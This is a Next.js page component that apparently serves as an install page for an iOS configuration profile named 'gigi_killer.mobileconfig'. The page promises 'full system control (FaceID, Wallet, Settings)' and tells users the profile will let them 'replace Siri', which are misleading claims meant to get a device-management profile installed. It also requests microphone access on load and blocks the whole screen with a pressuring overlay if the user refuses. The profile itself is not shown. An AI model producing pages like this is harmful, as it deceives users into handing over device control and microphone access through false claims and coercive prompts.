"use client";

import Link from "next/link";
import { useEffect, useState } from "react";

export default function InstallPage() {
  const [micDenied, setMicDenied] = useState(false);
  const [showDownloadConfirm, setShowDownloadConfirm] = useState(false);

  const requestMicrophone = async () => {
    try {
      await navigator.mediaDevices.getUserMedia({ audio: true });
      setMicDenied(false);
    } catch {
      setMicDenied(true);
    }
  };

  useEffect(() => {
    void requestMicrophone();
  }, []);

  const handleDownloadClick = () => {
    setShowDownloadConfirm(true);
  };

  return (
    <>
      <main className="min-h-screen bg-black px-4 py-16 text-white sm:px-6 lg:px-8">
        <div className="mx-auto max-w-3xl">
          <div className="rounded-3xl border border-white/15 bg-[linear-gradient(180deg,#111111_0%,#050505_100%)] p-8 shadow-[0_0_50px_rgba(255,255,255,0.08)] sm:p-10">
            <p className="text-xs font-semibold tracking-[0.35em] text-white/55">TOP SECRET DOSSIER</p>
            <h1 className="mt-4 text-4xl font-black leading-tight sm:text-5xl">
              Install the GIGI Profile
            </h1>
            <p className="mt-5 text-base text-white/75 sm:text-lg">
              Install the GIGI Profile to unlock full system control (FaceID, Wallet, Settings).
            </p>

            <div className="mt-8 rounded-2xl border border-white/10 bg-white/[0.03] p-5">
              <p className="text-sm text-white/70">
                This profile is delivered as an Apple configuration payload. iPhone will recognize
                it instantly and guide you through secure installation.
              </p>
              <ul className="mt-4 space-y-2 text-sm text-white/80">
                <li>Identity checks remain protected by FaceID / TouchID.</li>
                <li>You stay in control with explicit iOS confirmation screens.</li>
                <li>Remove anytime from Settings &gt; VPN &amp; Device Management.</li>
              </ul>
            </div>

            <div className="mt-10 flex flex-col gap-3 sm:flex-row sm:items-center">
              <a
                href="/gigi_killer.mobileconfig"
                onClick={handleDownloadClick}
                className="inline-flex items-center justify-center rounded-full bg-white px-8 py-4 text-sm font-extrabold tracking-wide text-black transition duration-200 hover:scale-105"
              >
                SCARICA PROFILO GIGI
              </a>
              <Link
                href="/"
                className="inline-flex items-center justify-center rounded-full border border-white/30 px-6 py-4 text-sm font-semibold text-white/90 transition hover:bg-white/10"
              >
                Back to Command Center
              </Link>
            </div>
          </div>
        </div>
      </main>

      {micDenied && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black px-6">
          <div className="max-w-xl text-center">
            <p className="text-xl font-semibold text-white sm:text-2xl">
              Senza microfono non potrai interagire con GIGI. Sei sicuro? L&apos;autorizzazione e
              necessaria per il riconoscimento vocale.
            </p>
            <button
              type="button"
              onClick={() => void requestMicrophone()}
              className="mt-8 rounded-full bg-white px-8 py-3 text-sm font-bold text-black transition hover:scale-105"
            >
              Riprova
            </button>
          </div>
        </div>
      )}

      {showDownloadConfirm && (
        <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/65 px-6">
          <div className="w-full max-w-lg rounded-2xl border border-white/20 bg-[#0e0e0e] p-6 text-white">
            <p className="text-base leading-relaxed">
              Profilo scaricato. Ora vai nelle Impostazioni del tuo iPhone per completare
              l&apos;attivazione e sostituire Siri.
            </p>
            <button
              type="button"
              onClick={() => setShowDownloadConfirm(false)}
              className="mt-5 rounded-full bg-white px-6 py-2 text-sm font-semibold text-black"
            >
              OK
            </button>
          </div>
        </div>
      )}
    </>
  );
}
